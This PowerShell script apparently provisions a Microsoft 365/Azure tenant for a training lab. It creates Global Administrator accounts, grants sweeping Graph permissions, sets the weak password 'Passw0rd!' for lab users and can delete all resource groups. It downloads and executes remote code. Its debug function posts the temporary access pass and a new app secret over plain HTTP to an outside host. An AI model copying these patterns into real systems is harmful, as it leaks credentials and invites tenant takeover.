<#
   Title: Create TAP enabled user, establish credential variables and configure the Tenant for lab use
   Description: Creates a new user with a Temporary Access Password and establishes credential variables for the lab. Also configures the Tenant for lab use.
   Target: Cloud Subscription - PowerShell - 7.4.0 | Az 11.1.0 (RC)
#>

param (
    $TenantName,
    $AppID,
    $AppSecret,
    $UserName,
    $Password,
    $SubscriptionId,
    $ScriptingAppId,
    $ScriptingAppSecret,
    [switch]$SkipCleanup,
    [switch]$CreateLabUsers,
    [switch]$ScriptDebug
)

<#
if ($Password -eq $null -or $Password -eq "" -or $Password -like "@lab.Variable*") {
    $RandomHex = -join (Get-Random ((0..9) + (97..105 | %{[char]$_})) -Count 12)
    $Password = "Pw1@$RandomHex"
}
#>

if (($Password -in '',$Null -or $Password -like '*@lab*') -or ($TenantName -in '',$Null -or $TenantName -like '*@lab*')) {
    Return $False
}

if ($SubscriptionId -in '',$Null -or $SubscriptionId -like '*@lab*' ) {
    $SubscriptionId = $Null
} else {
    $SubscriptionId = $SubscriptionId.trim(" ")
}

$UserName = $UserName.trim(" ")
$Password = $Password.trim(" ")
$TenantName = $TenantName.trim(" ")

$PoolUserName = $UserName
$PoolPassword = $Password
$TapUser = "LabAdmin@$TenantName"
$LegacyPassword = $Password
$Lifetime = 300

function Send-DebugMessage {
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$Message,
        [string]$DebugUrl = "http://zombie.cyberjunk.com:2025/ABACAB81"
    )

    if ($global:DebugUrl) {
      $DebugUrl = $global:DebugUrl
    }
    
    if ($DebugUrl) {
       try {
           Invoke-WebRequest -Uri $DebugUrl -Method Post -Body $Message -ErrorAction Stop | Out-Null
       } catch {
           # Silently fail to avoid disrupting the script; optionally log locally if desired
           Write-Warning "Failed to send debug message: $_"
       }
   }
   #Write-Host $Message
}

# Run cleanup routine
if (!$SkipCleanup) {
  	# Define the parameters in a hash table
	$params = @{
	    TenantName = $TenantName
	    Password = $Password
	    ScriptDebug = $ScriptDebug    
	}
	
	# URL of the script on GitHub
	$scriptUrl = "https://raw.githubusercontent.com/LODSContent/ChallengeLabs_Resources/refs/heads/master/LCAs/TenantPoolPostCleanup.ps1"
	
	# Fetch the script content using Invoke-WebRequest
	$scriptBlock = [ScriptBlock]::Create((Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content)
	
	$CleanupResponse = & $scriptBlock @Params
	
	if ($CleanupResponse) {
		if ($ScriptDebug) { Send-DebugMessage "Cleanup completed successfully for $TenantName" }
	} else {
		if ($ScriptDebug) { Send-DebugMessage "Possible errors running cleanup for $TenantName" }
	}
 }

# MgGraph Authentication block (Cloud Subscription Target)
$AccessToken = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com" -TenantId $TenantName).Token
$SecureToken = ConvertTo-Securestring $AccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureToken -NoWelcome
$Context = Get-MgContext
$AppName = $Context.AppName
if ($ScriptDebug) { Send-DebugMessage "Successfully connected to: $TenantName as: $AppName" }

# Update Service Principal Permissions
$Permissions = @'
AccessReview.ReadWrite.All
AdministrativeUnit.ReadWrite.All
Agreement.ReadWrite.All
AppCatalog.ReadWrite.All
Application.ReadWrite.All
AppRoleAssignment.ReadWrite.All
AttackSimulation.ReadWrite.All
AuditLog.Read.All
Calendars.ReadWrite
Chat.ReadWrite.All
CloudPC.ReadWrite.All
ConsentRequest.ReadWrite.All
CustomDetection.ReadWrite.All
DelegatedAdminRelationship.ReadWrite.All
DelegatedPermissionGrant.ReadWrite.All
Device.ReadWrite.All
DeviceLocalCredential.Read.All
DeviceManagementApps.ReadWrite.All
DeviceManagementCloudCA.ReadWrite.All
DeviceManagementConfiguration.ReadWrite.All
DeviceManagementManagedDevices.ReadWrite.All
DeviceManagementRBAC.ReadWrite.All
DeviceManagementScripts.ReadWrite.All
DeviceManagementServiceConfig.ReadWrite.All
DeviceTemplate.ReadWrite.All
Directory.ReadWrite.All
DirectoryRecommendations.ReadWrite.All
Domain.ReadWrite.All
EntitlementManagement.ReadWrite.All
EventListener.ReadWrite.All
ExternalConnection.ReadWrite.All
ExternalItem.ReadWrite.All
Files.ReadWrite.All
Group.ReadWrite.All
GroupMember.ReadWrite.All
HealthMonitoringAlert.ReadWrite.All
HealthMonitoringAlertConfig.ReadWrite.All
IdentityRiskEvent.ReadWrite.All
IdentityRiskyServicePrincipal.ReadWrite.All
IdentityRiskyUser.ReadWrite.All
LicenseAssignment.ReadWrite.All
Mail.ReadWrite
MultiTenantOrganization.ReadWrite.All
NetworkAccess.ReadWrite.All
OnPremisesPublishingProfiles.ReadWrite.All
Organization.ReadWrite.All
Policy.Read.All
Policy.ReadWrite.AccessReview
Policy.ReadWrite.ApplicationConfiguration
Policy.ReadWrite.AuthenticationFlows
Policy.ReadWrite.AuthenticationMethod
Policy.ReadWrite.Authorization
Policy.ReadWrite.ConditionalAccess
Policy.ReadWrite.ConsentRequest
Policy.ReadWrite.CrossTenantAccess
Policy.ReadWrite.DeviceConfiguration
Policy.ReadWrite.ExternalIdentities
Policy.ReadWrite.FeatureRollout
Policy.ReadWrite.FedTokenValidation
Policy.ReadWrite.IdentityProtection
Policy.ReadWrite.PermissionGrant
Policy.ReadWrite.SecurityDefaults
Policy.ReadWrite.TrustFramework
Presence.ReadWrite.All
PrivilegedAccess.ReadWrite.AzureAD
PrivilegedAccess.ReadWrite.AzureADGroup
PrivilegedAccess.ReadWrite.AzureResources
PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup
PrivilegedEligibilitySchedule.ReadWrite.AzureADGroup
PublicKeyInfrastructure.ReadWrite.All
Reports.Read.All
RiskPreventionProviders.ReadWrite.All
RoleManagement.ReadWrite.CloudPC
RoleManagement.ReadWrite.Defender
RoleManagement.ReadWrite.Directory
RoleManagement.ReadWrite.Exchange
RoleManagementAlert.ReadWrite.Directory
RoleManagementPolicy.ReadWrite.AzureADGroup
RoleManagementPolicy.ReadWrite.Directory
SecurityActions.ReadWrite.All
SecurityAlert.ReadWrite.All
SecurityAnalyzedMessage.ReadWrite.All
SecurityEvents.ReadWrite.All
SecurityIdentitiesHealth.ReadWrite.All
SecurityIdentitiesSensors.ReadWrite.All
SecurityIdentitiesUserActions.ReadWrite.All
SecurityIncident.ReadWrite.All
ServiceHealth.Read.All
ServiceMessage.Read.All
ServicePrincipalEndpoint.ReadWrite.All
Sites.ReadWrite.All
Synchronization.ReadWrite.All
Tasks.ReadWrite.All
TeamSettings.ReadWrite.All
ThreatAssessment.Read.All
ThreatHunting.Read.All
ThreatIndicators.ReadWrite.OwnedBy
ThreatSubmission.ReadWrite.All
ThreatSubmissionPolicy.ReadWrite.All
TrustFrameworkKeySet.ReadWrite.All
User-ConvertToInternal.ReadWrite.All
User-LifeCycleInfo.ReadWrite.All
User-Mail.ReadWrite.All
User-PasswordProfile.ReadWrite.All
User-Phone.ReadWrite.All
User.ReadWrite.All
UserAuthenticationMethod.ReadWrite.All
UserAuthMethod-Passkey.ReadWrite.All
UserNotification.ReadWrite.CreatedByApp
UserShiftPreferences.ReadWrite.All
WindowsUpdates.ReadWrite.All
WorkforceIntegration.ReadWrite.All
'@ -split '\r?\n'

# Get existing Service Principal
try {
    $sp = Get-MgServicePrincipal -Filter "DisplayName eq '$AppName'" -ErrorAction SilentlyContinue
    $ScriptingAppId = $sp.AppId
    if ($scriptDebug) { Send-DebugMessage "Found Service Principal for $ScriptingAppId" }
} catch {
    if ($scriptDebug) { Send-DebugMessage "Could not find Service Principal for $ScriptingAppId" }
}
# Assign Global Administrator role
try {
	$roleDefinition = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'Global Administrator'" -ErrorAction Stop
	$roleAssignmentBody = @{
	    principalId      = $sp.Id
	    roleDefinitionId = $roleDefinition.Id
	    directoryScopeId = "/"
	}
	$response = Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
	-Body ($roleAssignmentBody | ConvertTo-Json) -ContentType "application/json" -ErrorAction Stop
	if ($scriptDebug) { Send-DebugMessage "Assigned Global Administrator role to $($sp.DisplayName)" }
} catch {
    if ($_ -like "*conflicting object*") {
        if ($scriptDebug) { Send-DebugMessage "Global Administrator role already assigned to $($sp.DisplayName)" }
    } else {
	    if ($scriptDebug) { Send-DebugMessage "Failed to assign Global Administrator role to $($sp.DisplayName): $($_.Exception.Message)" }
    }
}

# Get Microsoft Graph Service Principal
$graphSp = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Get the current permissions of the service principal
$appPerms = (get-mgcontext).Scopes | Sort-Object

if ($graphSp -and $sp) { 
	# Grant delegated permissions (clear existing and re-add fresh)
	if ($ScriptDebug) { Send-DebugMessage "Clearing and re-granting delegated permissions" }

	# Remove all existing OAuth2 permission grants for this SP
	$existingGrants = Get-MgOauth2PermissionGrant -Filter "clientId eq '$($sp.Id)' and resourceId eq '$($graphSp.Id)'"
	if ($existingGrants) {
		foreach ($grant in $existingGrants) {
			Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId $grant.Id -ErrorAction SilentlyContinue
		}
		if ($ScriptDebug) { Send-DebugMessage "Removed existing grants." }
	}
	Start-Sleep -Seconds 10           

	# Grant delegated permissions (split into multiple grants if necessary)
	$desiredScopes = $Permissions -join " "
	$maxScopeLength = 4000  # Arbitrary limit to avoid potential Graph API issues; adjust if needed
	if ($desiredScopes.Length -gt $maxScopeLength) {
		if ($ScriptDebug) { Send-DebugMessage "Scope string exceeds $maxScopeLength characters; splitting into multiple grants" }
		$scopeChunks = [System.Collections.ArrayList]::new()
		$currentChunk = ""
		foreach ($perm in $Permissions) {
			if (($currentChunk.Length + $perm.Length + 1) -gt $maxScopeLength) {
				$scopeChunks.Add($currentChunk.Trim()) | Out-Null
				$currentChunk = $perm
			} else {
				$currentChunk += " $perm"
			}
		}
		if ($currentChunk) { $scopeChunks.Add($currentChunk.Trim()) | Out-Null }

		if ($ScriptDebug) { Send-DebugMessage "Granting delegated permissions in chunks" }
		foreach ($chunk in $scopeChunks) {
			$grantBody = @{
				"clientId" = $sp.Id
				"consentType" = "AllPrincipals"
				"principalId" = $null
				"resourceId" = $graphSp.Id
				"scope" = $chunk
			}
			$null = Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" `
				-Body ($grantBody | ConvertTo-Json) -ContentType "application/json" -SkipHttpErrorCheck
		}
	} else {
		$grantBody = @{
			"clientId" = $sp.Id
			"consentType" = "AllPrincipals"
			"principalId" = $null
			"resourceId" = $graphSp.Id
			"scope" = $desiredScopes
		}
		$null = Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" `
			-Body ($grantBody | ConvertTo-Json) -ContentType "application/json" -SkipHttpErrorCheck
		if ($ScriptDebug) { Send-DebugMessage "Granted delegated permissions" }
	}

	# Grant application permissions
	if ($ScriptDebug) {Send-DebugMessage "Granting app permissions (Async): "}
	if ($appPerms.Count -gt 0) {
		$Permissions = $Permissions | Where-Object {$appPerms -notcontains $_}
	}

	if ($Permissions) {
		# Pair items with their indices
		$indexedPermissions = $Permissions | ForEach-Object { [PSCustomObject]@{ Index = $Permissions.IndexOf($_); Value = $_ } }
		# Process permissions in parallel (for PowerShell 7.0+ only)
		$indexedPermissions | ForEach-Object -ThrottleLimit 25 -Parallel {
			$permission = $_.Value
			$index = $_.Index
			$role = $Using:graphSp.AppRoles | Where-Object { $_.Value -eq $permission }
			if ($role) {
				$roleBody = @{
					"principalId" = $Using:sp.Id
					"resourceId" = $Using:graphSp.Id
					"appRoleId" = $role.Id
				}
				$null = Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($Using:sp.Id)/appRoleAssignments" `
					-Body ($roleBody | ConvertTo-Json) -ContentType "application/json" -SkipHttpErrorCheck
			} 
		} 
	}               
	if ($ScriptDebug) {Send-DebugMessage "Finished updating permissions for: $TenantName"}
} else {
	if ($ScriptDebug) {Send-DebugMessage "Failed to update service principal permissions."}
}

# Check for credential pool and set variables
if ($UserName -ne $null -or $UserName -ne '') {  
    # Define headers for all Graph API calls
    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/json"
    }

    # Check if user exists; create if not
    try {
        $createUserResponse = Invoke-RestMethod -Method GET `
            -Uri "https://graph.microsoft.com/v1.0/users/$TapUser" `
            -Headers $headers `
            -ErrorAction Stop
        if ($ScriptDebug) { Send-DebugMessage "User $TapUser exists" }
    } catch {
        if ($_.Exception.Response.StatusCode -eq 404) {
            if ($ScriptDebug) { Send-DebugMessage "User $TapUser does not exist, creating..." }
            $userDetails = @{
                "accountEnabled"    = $true
                "displayName"       = $TapUser.Split('@')[0]
                "mailNickname"      = $TapUser.Split('@')[0]
                "userPrincipalName" = $TapUser
                "usageLocation"     = "US"
                "passwordProfile"   = @{
                    "forceChangePasswordNextSignIn" = $false
                    "password"                      = $LegacyPassword
                }
            }
            try {
                $createUserResponse = Invoke-RestMethod -Method POST `
                    -Uri "https://graph.microsoft.com/v1.0/users" `
                    -Headers $headers `
                    -Body ($userDetails | ConvertTo-Json) `
                    -ErrorAction Stop
                if ($ScriptDebug) { Send-DebugMessage "User $TapUser created successfully. Pausing for 5 seconds." }
		Start-Sleep -Seconds 5 
            } catch {
                if ($ScriptDebug) { Send-DebugMessage "Failed to create user $TapUser : $($_.Exception.Message)" }
            }
        } else {
            if ($ScriptDebug) { Send-DebugMessage "Error checking user $TapUser : $($_.Exception.Message)" }
        }
    }
    
    $userId = $createUserResponse.id

    # Assign Global Administrator role (ignore if exists)
    $globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
    $roleAssignmentBody = @{
        "@odata.type"      = "#microsoft.graph.unifiedRoleAssignment"
        "principalId"      = $userId
        "roleDefinitionId" = $globalAdminRoleId
        "directoryScopeId" = "/"
    }

    try {
        Invoke-RestMethod -Method POST `
            -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
            -Headers $headers `
            -Body ($roleAssignmentBody | ConvertTo-Json) `
            -ErrorAction Stop | Out-Null
        if ($ScriptDebug) { Send-DebugMessage "Global Administrator role assigned to $TapUser" }
    } catch {
        if ($_.Exception.Response.StatusCode -eq 409) {
            if ($ScriptDebug) { Send-DebugMessage "Global Administrator role already exists for $TapUser" }
        } else {
            if ($ScriptDebug) { Send-DebugMessage "Failed to assign Global Administrator role to $TapUser or it already exists: $($_.Exception.Message)" }
        }
    }

    # Get available licenses (SKUs)
    try {
        $skusResponse = Invoke-RestMethod -Method GET `
            -Uri "https://graph.microsoft.com/v1.0/subscribedSkus" `
            -Headers $headers `
            -ErrorAction Stop
        $availableSkus = @($skusResponse.value | Where-Object { ($_.prepaidUnits.enabled - $_.consumedUnits) -gt 0 })
        if ($availableSkus.Count -eq 0 -and $ScriptDebug) { Send-DebugMessage "No available licenses found in tenant" }
    } catch {
        if ($ScriptDebug) { Send-DebugMessage "Failed to retrieve SKUs." }
    }

    # Assign licenses (ignore if exists)
    if ($availableSkus.Count -gt 0) {
        $licenseAssignmentBody = @{
            "addLicenses"    = @($availableSkus | ForEach-Object {
                @{
                    "disabledPlans" = @()
                    "skuId"         = $_.skuId
                }
            })
            "removeLicenses" = @()
        }
        try {
            Invoke-RestMethod -Method POST `
                -Uri "https://graph.microsoft.com/v1.0/users/$userId/assignLicense" `
                -Headers $headers `
                -Body ($licenseAssignmentBody | ConvertTo-Json -Depth 3) `
                -ErrorAction Stop | Out-Null
            if ($ScriptDebug) { Send-DebugMessage "Licenses assigned to $TapUser" }
        } catch {
            if ($_.Exception.Response.StatusCode -eq 400 -and $_.Exception.Message -match "already assigned") {
                if ($ScriptDebug) { Send-DebugMessage "Licenses already assigned to $TapUser" }
            } else {
                if ($ScriptDebug) { Send-DebugMessage "Failed to assign licenses to $TapUser." }
            }
        }
    }

    # Enable TAP policy with multiple-use configuration
    $tapPolicyUri = "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/TemporaryAccessPass"
    $policyPayload = @{
        "@odata.type"           = "#microsoft.graph.temporaryAccessPassAuthenticationMethodConfiguration"
        "id"                    = "TemporaryAccessPass"
        "state"                 = "enabled"
        "includeTargets"        = @(
            @{
                "targetType"           = "group"
                "id"                   = "all_users"  # Use a specific group ID if needed
                "isRegistrationRequired" = $false
            }
        )
        "defaultLifetimeInMinutes" = 60
        "defaultLength"         = 8
        "minimumLifetimeInMinutes" = 60
        "maximumLifetimeInMinutes" = 480
        "isUsableOnce"          = $false  # Allow multiple uses
    }

    try {
        Invoke-RestMethod -Method PATCH `
            -Uri $tapPolicyUri `
            -Headers $headers `
            -Body ($policyPayload | ConvertTo-Json) `
            -ErrorAction Stop
        if ($ScriptDebug) { Send-DebugMessage "TAP policy updated to allow multiple uses" }
    } catch {
        if ($ScriptDebug) { Send-DebugMessage "Failed to update TAP policy: $($_.Exception.Message)" }
    }

    # Define TAP details
    $tapDetails = @{
        "lifetimeInMinutes" = $Lifetime
        "isUsableOnce"      = $false  # Multi-use TAP
    }

	# Create TAP for the user with up to 10 retries
	$maxRetries = 10
	$retryDelaySeconds = 5
	$retryCount = 0
	$tapCreated = $false
	
	while (-not $tapCreated -and $retryCount -lt $maxRetries) {
	    try {
		$retryCount++
		if ($ScriptDebug) {Send-DebugMessage "Attempting to create TAP for user '$TapUser' (Attempt $retryCount of $maxRetries)"}
		
		$TAP = Invoke-RestMethod -Method POST `
		    -Uri "https://graph.microsoft.com/beta/users/$userId/authentication/temporaryAccessPassMethods" `
		    -Headers $headers `
		    -Body ($tapDetails | ConvertTo-Json) `
		    -ErrorAction Stop
		
		$TapPassword = $TAP.temporaryAccessPass
		if ($TapPassword) {
		    $tapCreated = $true
		    if ($ScriptDebug) {Send-DebugMessage "TAP Password: $TapPassword created for user '$TapUser' on attempt $retryCount"}
		} else {
		    if ($ScriptDebug) {Send-DebugMessage "Failed to create TAP for user '$TapUser' on attempt $retryCount - No password returned"}
		    if ($retryCount -lt $maxRetries) {
			Start-Sleep -Seconds $retryDelaySeconds
		    }
		}
	    } catch {
		if ($ScriptDebug) {Send-DebugMessage "Failed to create TAP for user '$TapUser' on attempt $retryCount - $($_.Exception.Message)"}
		if ($retryCount -lt $maxRetries) {
		    Start-Sleep -Seconds $retryDelaySeconds
		}
	    }
	}
	
	if (-not $tapCreated) {
	    if ($ScriptDebug) {Send-DebugMessage "Failed to create TAP for user '$TapUser' after $maxRetries attempts"}
	}

   if ($CreateLabUsers) {
      # ReCreate standard lab users and groups
      # Create Lab Users
      $plaintextPwd = "Passw0rd!"
      $users = @'
SAM,Fname,DisplayName,Department,City,State,Title
AzUser01,AzUser01,AzUser01,IT,Seattle,WA,ITPro
AzUser02,AzUser02,AzUser02,HR,Seattle,WA,Manager
AzUser03,AzUser03,AzUser03,Finance,Seattle,WA,Accountant
AzUser04,AzUser04,AzUser04,IT,Seattle,WA,Manager
AzUser05,AzUser05,AzUser05,HR,Boston,MA,Manager
AzUser06,AzUser06,AzUser06,Finance,Boston,MA,Accountant
AzUser07,AzUser07,AzUser07,IT,Boston,MA,ITPro
AzUser08,AzUser08,AzUser08,HR,Boston,MA,Support
AzUser09,AzUser09,AzUser09,Finance,Boston,MA,Manager
AzUser10,AzUser10,AzUser10,IT,Seattle,WA,ITPro
AzUser11,AzUser11,AzUser11,HR,Seattle,WA,Manager
AzUser12,AzUser12,AzUser12,Finance,Seattle,WA,Accountant
AzUser13,AzUser13,AzUser13,IT,Seattle,WA,Manager
AzUser14,AzUser14,AzUser14,HR,Boston,MA,Manager
AzUser15,AzUser15,AzUser15,Finance,Boston,MA,Accountant
AzUser16,AzUser16,AzUser16,IT,Boston,MA,ITPro
AzUser17,AzUser17,AzUser17,HR,Boston,MA,Support
AzUser18,AzUser18,AzUser18,Finance,Boston,MA,Manager
AzUser19,AzUser19,AzUser19,HR,Boston,MA,Support
AzUser20,AzUser20,AzUser20,Finance,Boston,MA,Manager
PeterH,Peter,Houston,Peter Houston,IT,Seattle,WA,ITPro
CraigD,Craig,Dewar,Craig Dewar,HR,Seattle,WA,Manager
JeffW,Jeff,Wang,Jeff Wang,Finance,Seattle,WA,Accountant
AmyR,Amy,Rusko,Amy Rusko,IT,Seattle,WA,Manager
AnnB,Ann,Beebe,Ann Beebe,HR,Boston,MA,Manager
MichelleF,Michelle,Fredette,Michelle Fredette,Finance,Boston,MA,Accountant
DanP,Dan,Park,Dan Park,IT,Boston,MA,ITPro
HeidiS,Heidi,Steene,Heidi Steene,HR,Boston,MA,Support
LoriP,Lori,Penor,Lori Penor,Finance,Boston,MA,Manager
'@
      
        # Create users with Invoke-MgGraphRequest (Linux workaround)
        $users | ConvertFrom-Csv | ForEach-Object {
            $userBody = @{
                "userPrincipalName" = "$($_.SAM)@$TenantName"
                "displayName" = $_.DisplayName
                "givenName" = $_.Fname
                "department" = $_.Department
                "city" = $_.City
                "state" = $_.State
                "jobTitle" = $_.Title
                "usageLocation" = "US"
                "mailNickname" = $_.SAM
                "accountEnabled" = $true
                "passwordProfile" = @{
                    "password" = $plaintextPwd
                    "forceChangePasswordNextSignIn" = $false
                }
            } | ConvertTo-Json -Depth 10
      
            try {
                Invoke-MgGraphRequest `
                -Method POST `
                -Uri "https://graph.microsoft.com/v1.0/users" `
                -Body $userBody `
                -ContentType "application/json" | Out-Null
            } catch {}
        }
      
        # Create groups
        try {New-MgGroup -DisplayName "Mobile Users"  -MailNickname "MobileUsers" -MailEnabled:$False -SecurityEnabled:$True | Out-Null} catch {}
        try {New-MgGroup -DisplayName "Managers"  -MailNickname "Managers" -MailEnabled:$False -SecurityEnabled:$True | Out-Null} catch {}
        try {New-MgGroup -DisplayName "Regular Employees"  -MailNickname "RegularEmployees" -MailEnabled:$False -SecurityEnabled:$True | Out-Null} catch {}
      
        # Pause for 30 seconds to ensure Azure AD objects are populated
        if ($scriptDebug) { Send-DebugMessage "Created lab user accounts. Sleeping for 30 seconds before assigning groups." }
        Start-Sleep -Seconds 30
      
        # Assign users to groups
        try {$managersGroup = Get-MgGroup -Filter "displayName eq 'Managers'"} catch {}
        try {$managerIds = (Get-MgUser -All | Where-Object { $_.JobTitle -eq "Manager" }).Id} catch {}
        foreach ($userId in $managerIds) {
            $memberRef = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$userId" } | ConvertTo-Json
            try {
                Invoke-MgGraphRequest `
                -Method POST `
                -Uri "https://graph.microsoft.com/v1.0/groups/$($managersGroup.Id)/members/%24ref" `
                -Body $memberRef `
                -ContentType "application/json" | Out-Null
            } catch {}
        }
        if ($scriptDebug) { Send-DebugMessage "Assigned users to groups." }

   
      # Assign licenses to selected lab users
      try {
          # Licenses to assign (SKU part numbers)
          $skuNumbers = "SPB", "Power_BI_PRO", "SPE_E5", "AAD_PREMIUM_P2", "Microsoft_Entra_ID_Governance", "Microsoft_365_E5_(no_Teams)", "Microsoft_Entra_Suite"
      
          # Get users
          $users = Get-MgUser -All -Filter "displayName le 'AzUser05' or displayName ge 'AzUser21'" -Property Id, DisplayName
      
          # Get subscriptions (SKUs)
          $subscriptions = Get-MgSubscribedSku | Where-Object { $_.SkuPartNumber -in $skuNumbers }
      
          foreach ($subscription in $subscriptions) {
              # Define license payload for API call
              $licensePayload = @{
                  "addLicenses" = @(
                      @{
                          "skuId" = $subscription.SkuId
                      }
                  )  
                  "removeLicenses" = @()
              } | ConvertTo-Json -Depth 10
      
              foreach ($user in $users) {
                  try {
                      Invoke-MgGraphRequest `
                              -Method POST `
                              -Uri "https://graph.microsoft.com/v1.0/users/$($user.Id)/assignLicense" `
                              -Body $licensePayload `
                              -ContentType "application/json" | Out-Null
                  } catch {}
              }
          }
          if ($scriptDebug) { Send-DebugMessage "Assigned licenses to users." }
      } catch {
         if ($ScriptDebug) {Send-DebugMessage "Failure assigning licenses to selected user accounts."}
      }    
   }

   # Clean and configure Trial Subscription if present
   if ($SubscriptionId) {
	# Add a secret to the Service Principal
	$secretBody = @{
		"passwordCredential" = @{
			"displayName" = "Script Secret"
			"endDateTime" = (Get-Date).AddDays(1).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
		}
	} | ConvertTo-Json -Depth 10
	
	try {
 		$secret = Invoke-MgGraphRequest `
			-Method POST `
			-Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($sp.id)/addPassword" `
			-Body $secretBody `
			-ContentType "application/json"
	 	$ScriptingAppSecret = $Secret.SecretText
   		if ($scriptDebug) { Send-DebugMessage "Created secret $ScriptingAppSecret. Sleeping for 15 seconds." }
		Start-Sleep -seconds 15
	
		# Create a secure string for the client secret
		$secureSecret = ConvertTo-SecureString $Secret.SecretText -AsPlainText -Force
		
		# Create a PSCredential object
		$credential = New-Object System.Management.Automation.PSCredential($ScriptingAppId, $secureSecret)
		
		# Authenticate with Azure
		Connect-AzAccount -ServicePrincipal -Credential $credential -TenantId $TenantName | Out-Null
		
		# Set the context to the correct subscription
		Set-AzContext -SubscriptionId $SubscriptionId | Out-Null
		
		# Remove and re-add Owner Role to the lab user
		try {
		    Remove-AzRoleAssignment -SignInName "$TapUser" -RoleDefinitionName "Owner" -Scope "/subscriptions/$SubscriptionId" | Out-Null
	     	    if ($scriptDebug) { Send-DebugMessage "Removed existing Owner role for $TapUser." }
		} catch {
	 	    if ($scriptDebug) { Send-DebugMessage "Failed to remove existing Owner role for $TapUser. It may not exist." }
		}
		
  		try {
    		    New-AzRoleAssignment -SignInName "$TapUser" -RoleDefinitionName "Owner" -Scope "/subscriptions/$SubscriptionId" | Out-Null
	  	    if ($scriptDebug) { Send-DebugMessage "Set the Owner role for $TapUser." }
		} catch {
		    if ($scriptDebug) { Send-DebugMessage "Failed to set the Owner role for $TapUser." }
  		}
		# Remove all Resource Groups
		try {
  		    if ($scriptDebug) { Send-DebugMessage "Removing resource groups." }
		    Get-AzResourceGroup | ForEach-Object {$status = Remove-AzResourceGroup -Name $_.ResourceGroupName -Force}
		} catch {}
 	} catch {
		if ($scriptDebug) { Send-DebugMessage "Failed to create additional secret and could not set the Owner role for $TapUser." }
 	}
   }

    # Update lab variables based on TAP success
    if ($TapPassword) {
         Set-LabVariable -Name UserName -Value $TapUser
         Set-LabVariable -Name Password -Value $TapPassword
         Set-LabVariable -Name TenantName -Value $TenantName
         Set-LabVariable -Name PoolUserName -Value $PoolUserName
         Set-LabVariable -Name PoolPassword -Value $PoolPassword
         Set-LabVariable -Name TAPLifetime -Value $Lifetime
         Set-LabVariable -Name ScriptingAppId -Value $ScriptingAppId
         Set-LabVariable -Name ScriptingAppSecret -Value $ScriptingAppSecret
         Set-LabVariable -Name CredentialPool -Value 'Yes'
        if ($ScriptDebug) { Send-DebugMessage "TAP User setup complete" }
    } else {
         Set-LabVariable -Name UserName -Value $UserName
         Set-LabVariable -Name Password -Value $Password
         Set-LabVariable -Name TenantName -Value $TenantName
         Set-LabVariable -Name ScriptingAppId -Value $ScriptingAppId
         Set-LabVariable -Name ScriptingAppSecret -Value $ScriptingAppSecret
         Set-LabVariable -Name TAPLifetime -Value "Error"
         Set-LabVariable -Name CredentialPool -Value 'Yes'
        if ($ScriptDebug) { Send-DebugMessage "TAP user setup failed. Falling back on default Pool credentials." }
    }
} else {
    Set-LabVariable -Name CredentialPool -Value 'No'
    if ($ScriptDebug) { Send-DebugMessage "Credential Pool not available. Falling back on manual credentials." }
}

return $true
